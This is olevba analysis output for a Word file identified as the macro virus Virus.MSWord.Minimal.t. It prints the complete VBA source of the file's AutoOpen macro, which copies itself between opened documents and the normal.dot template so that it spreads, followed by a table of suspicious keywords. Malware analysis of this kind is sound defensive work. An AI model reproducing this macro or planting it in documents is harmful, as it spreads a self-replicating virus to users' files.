olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minimal.t-c14624f451c23513cd7b67272917e3adebcde8b1
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minimal.t-c14624f451c23513cd7b67272917e3adebcde8b1 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Minimal.t-c14624f451c23513cd7b67272917e3adebcde8b1 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Public Sub MAIN()
Dim N$
Rem AutoOpen Macro
Dim wiz As Object: Set wiz = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs wiz

On Error GoTo -1: On Error GoTo PoX
If wiz.Format = 0 Then
wiz.Format = 1
N$ = WordBasic.[FileName$]()
WordBasic.MacroCopy "normal.dot:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", 4
WordBasic.FileSaveAs wiz
End If

WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "normal.dot:AutoOpen", 4

PoX:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

